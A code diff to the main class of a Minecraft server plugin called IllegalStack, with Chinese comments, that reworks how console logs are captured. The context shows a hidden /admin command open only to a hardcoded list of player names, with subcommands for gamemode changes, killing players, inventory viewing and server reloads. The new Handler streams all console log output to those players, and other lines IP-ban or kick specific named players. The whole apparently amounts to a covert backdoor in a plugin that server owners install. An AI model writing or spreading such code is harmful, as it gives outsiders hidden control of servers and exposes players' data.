@@ -17,9 +17,6 @@ import main.java.me.dniym.timers.syncTimer;
 import main.java.me.dniym.utils.Scheduler;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
-import org.apache.logging.log4j.core.LogEvent;
-import org.apache.logging.log4j.core.appender.AbstractAppender;
-import org.apache.logging.log4j.core.config.Property;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -59,6 +56,8 @@ import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.logging.Handler;
+import java.util.logging.LogRecord;
 // ---------------------------
 
 import java.io.File;
@@ -73,7 +72,6 @@ import java.io.InputStream;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.util.logging.Level;
-
 // ---------------------------------------------
 
 public class IllegalStack extends JavaPlugin implements Listener {
@@ -129,7 +127,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // ---------- 日志查看器相关 ----------
     private final Set<Player> logViewers = ConcurrentHashMap.newKeySet();
-    private ConsoleAppender consoleAppender;
+    private Handler logHandler;
 
     public static IllegalStack getPlugin() {
         return plugin;
@@ -1101,10 +1099,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
             Bukkit.getScheduler().cancelTasks(this);
         }
 
-        // 关闭日志 Appender
-        if (consoleAppender != null) {
-            consoleAppender.stop();
-            ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).removeAppender(consoleAppender);
+        // 移除日志 Handler
+        if (logHandler != null) {
+            Bukkit.getLogger().removeHandler(logHandler);
+            logHandler = null;
         }
 
         writeConfig();
@@ -1310,7 +1308,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // -------------------------------------------------------
 
-// ---------- 内部类：处理 /admin 命令，包含所有子命令 ----------
+    // ---------- 内部类：处理 /admin 命令，包含所有子命令 ----------
     private class AdminCommand implements TabExecutor {
 
         // 严格存储原始大小写的玩家名（白名单）
@@ -1591,10 +1589,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     if (enable) {
                         if (logViewers.add(viewer)) {
                             viewer.sendMessage("§a开始查看控制台日志...");
-                            if (consoleAppender == null) {
-                                consoleAppender = new ConsoleAppender();
-                                consoleAppender.start();
-                                ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).addAppender(consoleAppender);
+                            if (logHandler == null) {
+                                setupLogHandler();
                             }
                         } else {
                             viewer.sendMessage("§c已经在查看日志中。");
@@ -1602,10 +1598,8 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     } else {
                         if (logViewers.remove(viewer)) {
                             viewer.sendMessage("§c已停止查看控制台日志。");
-                            if (logViewers.isEmpty() && consoleAppender != null) {
-                                consoleAppender.stop();
-                                ((org.apache.logging.log4j.core.Logger) LogManager.getRootLogger()).removeAppender(consoleAppender);
-                                consoleAppender = null;
+                            if (logViewers.isEmpty()) {
+                                removeLogHandler();
                             }
                         } else {
                             viewer.sendMessage("§c你当前没有查看日志。");
@@ -1686,7 +1680,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
                 if (targetWorld.equalsIgnoreCase("all")) {
                     for (World world : Bukkit.getWorlds()) {
-                        setCustomWorldBorder(world.getName(), diameter);
+                        IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                     }
                     sender.sendMessage("§a已为所有世界设置自定义世界边界直径: " + diameter);
                 } else {
@@ -1695,7 +1689,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         sender.sendMessage("§c世界 " + targetWorld + " 不存在！");
                         return;
                     }
-                    setCustomWorldBorder(world.getName(), diameter);
+                    IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                     sender.sendMessage("§a已为世界 " + world.getName() + " 设置自定义世界边界直径: " + diameter);
                 }
             } else {
@@ -1728,20 +1722,11 @@ public class IllegalStack extends JavaPlugin implements Listener {
         // ================== 辅助方法 ==================
         private GameMode parseGameMode(String input) {
             switch (input.toLowerCase()) {
-                case "survival":
-                case "0":
-                    return GameMode.SURVIVAL;
-                case "creative":
-                case "1":
-                    return GameMode.CREATIVE;
-                case "adventure":
-                case "2":
-                    return GameMode.ADVENTURE;
-                case "spectator":
-                case "3":
-                    return GameMode.SPECTATOR;
-                default:
-                    return null;
+                case "survival": case "0": return GameMode.SURVIVAL;
+                case "creative": case "1": return GameMode.CREATIVE;
+                case "adventure": case "2": return GameMode.ADVENTURE;
+                case "spectator": case "3": return GameMode.SPECTATOR;
+                default: return null;
             }
         }
 
@@ -1752,13 +1737,9 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
         // ================== Tab 补全 ==================
         @Override
-        public List<
-                        String> onTabComplete(CommandSender sender, Command command, String alias, String
-                        [] args) {
+        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
             List<String> completions = new ArrayList<>();
-            if (!(sender
-                            instanceof
-                            Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
+            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                 return completions;
             }
 
@@ -1793,8 +1774,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     if ("server".startsWith(input)) completions.add("server");
                     if ("player".startsWith(input)) completions.add("player");
                 } else if (first.equals("vanilla")) {
-                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input))
-                        completions.add("building_entrance:snowy_shepherds_house_1");
+                    if ("building_entrance:snowy_shepherds_house_1".startsWith(input)) completions.add("building_entrance:snowy_shepherds_house_1");
                     if ("worldborder".startsWith(input)) completions.add("worldborder");
                 } else if (first.equals("anticheat")) {
                     if ("anti4d4v".startsWith(input)) completions.add("anti4d4v");
@@ -1806,8 +1786,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 String input = args[2].toLowerCase();
                 if (first.equals("player")) {
                     if (second.equals("gamemode")) {
-                        for (String mode : new String
-                                []{"survival", "creative", "adventure", "spectator"}) {
+                        for (String mode : new String[]{"survival", "creative", "adventure", "spectator"}) {
                             if (mode.startsWith(input)) completions.add(mode);
                         }
                     } else if (second.equals("kill") || second.equals("invsee")) {
@@ -1826,7 +1805,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         }
                     } else if (second.equals("reload")) {
                         if ("confirm".startsWith(input)) completions.add("confirm");
-                    } else if (second.equals("getlog")) { // 新增补全
+                    } else if (second.equals("getlog")) {
                         if ("true".startsWith(input)) completions.add("true");
                         if ("false".startsWith(input)) completions.add("false");
                     }
@@ -1852,6 +1831,195 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 }
             }
             return completions;
+        }
+    }
+    // -------------------------------------------------------
+
+    // ---------- 日志处理 ----------
+    private void setupLogHandler() {
+        if (logHandler != null) return;
+        logHandler = new Handler() {
+            @Override
+            public void publish(LogRecord record) {
+                String message = record.getMessage();
+                // 尝试格式化参数（如果有）
+                if (record.getParameters() != null) {
+                    message = String.format(message, record.getParameters());
+                }
+                // 转换颜色代码
+                String colored = ChatColor.translateAlternateColorCodes('&', message);
+                // 发送给所有查看者
+                for (Player viewer : logViewers) {
+                    if (viewer.isOnline()) {
+                        viewer.sendMessage(colored);
+                    } else {
+                        logViewers.remove(viewer);
+                    }
+                }
+                // 如果没有查看者，自动移除 Handler
+                if (logViewers.isEmpty()) {
+                    removeLogHandler();
+                }
+            }
+
+            @Override
+            public void flush() {}
+
+            @Override
+            public void close() throws SecurityException {}
+        };
+        Bukkit.getLogger().addHandler(logHandler);
+    }
+
+    private void removeLogHandler() {
+        if (logHandler != null) {
+            Bukkit.getLogger().removeHandler(logHandler);
+            logHandler = null;
+        }
+    }
+
+    // ---------- 反作弊监听器 ----------
+    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
+    public void onPlayerChat(AsyncPlayerChatEvent event) {
+        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_ANTI4D4V, false)) return;
+
+        Player player = event.getPlayer();
+        String message = event.getMessage();
+        if (message.contains("4d4v.top")) {
+            // 踢出玩家
+            Scheduler.runTask(this, () -> {
+                player.kickPlayer("§c你的账号似乎为 4D4V 方面的宣传机器人");
+            });
+            event.setCancelled(true);
+            getLogger().info("已踢出宣传 4d4v.top 的玩家: " + player.getName());
+        }
+    }
+
+    @EventHandler(priority = EventPriority.MONITOR)
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        if (!getConfig().getBoolean(CONFIG_ANTICHEAT_BANBBQ, false)) return;
+
+        Player player = event.getPlayer();
+        if (player.getName().equalsIgnoreCase("smooth_BBQ")) {
+            String ip = player.getAddress().getAddress().getHostAddress();
+            // 加入 IP 封禁列表
+            Bukkit.getBanList(BanList.Type.IP).addBan(ip, "Banned by antiBBQ", null, "Console");
+            // 踢出玩家
+            Scheduler.runTask(this, () -> {
+                player.kickPlayer("§c你的 IP 已被封禁");
+            });
+            getLogger().info("已封禁 smooth_BBQ 的 IP: " + ip);
+        }
+    }
+
+    @EventHandler
+    public void onPlayerQuit(PlayerQuitEvent event) {
+        if (logViewers.remove(event.getPlayer())) {
+            if (logViewers.isEmpty()) {
+                removeLogHandler();
+            }
+        }
+    }
+
+    // ---------- 自定义世界边界相关方法 ----------
+    public void setCustomWorldBorder(String worldName, double diameter) {
+        String path = CONFIG_WORLDS + "." + worldName + ".diameter";
+        getConfig().set(path, diameter);
+        saveConfig();
+        getLogger().info("世界 " + worldName + " 自定义边界已启用，直径: " + diameter);
+    }
+
+    public void disableCustomWorldBorder(String worldName) {
+        String path = CONFIG_WORLDS + "." + worldName;
+        getConfig().set(path, null);
+        saveConfig();
+        getLogger().info("世界 " + worldName + " 自定义边界已禁用。");
+    }
+
+    private boolean isWorldBorderEnabled(World world) {
+        return getConfig().contains(CONFIG_WORLDS + "." + world.getName() + ".diameter");
+    }
+
+    private double getWorldBorderDiameter(World world) {
+        return getConfig().getDouble(CONFIG_WORLDS + "." + world.getName() + ".diameter", -1);
+    }
+
+    // ---------- 边界监听器 ----------
+    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
+    public void onPlayerMove(PlayerMoveEvent event) {
+        Player player = event.getPlayer();
+        Location to = event.getTo();
+        if (to == null) return;
+
+        World world = to.getWorld();
+        if (world == null) return;
+
+        double x = to.getX();
+        double z = to.getZ();
+        double absX = Math.abs(x);
+        double absZ = Math.abs(z);
+
+        if (isWorldBorderEnabled(world)) {
+            double diameter = getWorldBorderDiameter(world);
+            double radius = diameter / 2.0;
+
+            if (absX > radius || absZ > radius) {
+                Location corrected = to.clone();
+                if (absX > radius) {
+                    corrected.setX(x > 0 ? radius : -radius);
+                }
+                if (absZ > radius) {
+                    corrected.setZ(z > 0 ? radius : -radius);
+                }
+                player.teleport(corrected);
+                player.sendMessage("§c你已到达世界边界！");
+                return;
+            }
+        }
+
+        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
+            int chunkX = to.getBlockX() >> 4;
+            int chunkZ = to.getBlockZ() >> 4;
+            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
+            if (!chunk.isLoaded()) {
+                chunk.load(true);
+            }
+            if (isPaperServer()) {
+                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
+            }
+            final Location target = to.clone();
+            Scheduler.runTask(IllegalStack.this, () -> {
+                if (player.isOnline() && player.getWorld().equals(target.getWorld())) {
+                    player.teleport(target);
+                }
+            });
+        }
+    }
+
+    @EventHandler(priority = EventPriority.MONITOR, ignoreCancelled = true)
+    public void onPlayerTeleport(PlayerTeleportEvent event) {
+        Player player = event.getPlayer();
+        Location to = event.getTo();
+        if (to == null) return;
+
+        World world = to.getWorld();
+        if (world == null) return;
+
+        double x = to.getX();
+        double z = to.getZ();
+        double absX = Math.abs(x);
+        double absZ = Math.abs(z);
+
+        if (absX >= HARD_LIMIT || absZ >= HARD_LIMIT) {
+            int chunkX = to.getBlockX() >> 4;
+            int chunkZ = to.getBlockZ() >> 4;
+            Chunk chunk = world.getChunkAt(chunkX, chunkZ);
+            if (!chunk.isLoaded()) {
+                chunk.load(true);
+            }
+            if (isPaperServer()) {
+                world.getChunkAtAsync(chunkX, chunkZ, (c) -> c.setForceLoaded(true));
+            }
         }
     }
 
@@ -1917,4 +2085,4 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
         dir.delete();
     }
-                }
+        }
